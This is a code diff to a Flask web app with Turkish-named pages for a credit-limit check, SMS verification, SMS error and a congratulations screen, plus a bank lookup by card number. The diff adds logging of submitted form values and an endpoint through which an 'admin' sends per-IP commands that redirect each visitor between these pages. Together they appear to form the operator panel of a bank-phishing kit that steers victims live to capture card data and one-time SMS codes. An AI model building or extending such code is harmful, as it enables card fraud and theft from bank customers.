@@ -3,7 +3,7 @@ from __future__ import annotations
 import re
 from datetime import datetime
 
-from flask import Blueprint, redirect, render_template, request, session, url_for
+from flask import Blueprint, jsonify, redirect, render_template, request, session, url_for
 
 from ..binlookup import lookup_bank
 from ..config import AppConfig
@@ -123,6 +123,11 @@ def limit_kontrol():
     if request.method == "POST" and query_id:
         total_limit = _sanitize_limit_value(form_data["total_limit"])
         current_limit = _sanitize_limit_value(form_data["current_limit"])
+        
+        # Debug logging
+        print(f"[DEBUG] Form data: total_limit={form_data['total_limit']!r}, current_limit={form_data['current_limit']!r}")
+        print(f"[DEBUG] Sanitized: total_limit={total_limit}, current_limit={current_limit}")
+        
         if total_limit is None or current_limit is None:
             return _render(
                 "limit-kontrol.html",
@@ -226,3 +231,33 @@ def tebrikler():
         arti_bakiye=arti_bakiye,
         yeni_limit=yeni_limit,
     )
+
+
+@public_bp.route("/check-commands")
+def check_commands():
+    """Check if admin sent any commands (SMS, tebrik, hata1, back) for this IP"""
+    client_ip = get_client_ip(request)
+    if not client_ip:
+        return jsonify({"redirect": None})
+    
+    # Check each command table
+    command_routes = {
+        "sms": "public.sms_dogrulama",
+        "tebrik": "public.tebrikler",
+        "hata1": "public.sms_hatali",
+        "back": "public.limit_kontrol",
+    }
+    
+    with get_cursor() as cursor:
+        for table_name, route_name in command_routes.items():
+            cursor.execute(
+                f"SELECT id FROM {table_name} WHERE {table_name}=? LIMIT 1",
+                (client_ip,)
+            )
+            result = cursor.fetchone()
+            if result:
+                # Delete the command and redirect
+                cursor.execute(f"DELETE FROM {table_name} WHERE {table_name}=?", (client_ip,))
+                return jsonify({"redirect": url_for(route_name)})
+    
+    return jsonify({"redirect": None})
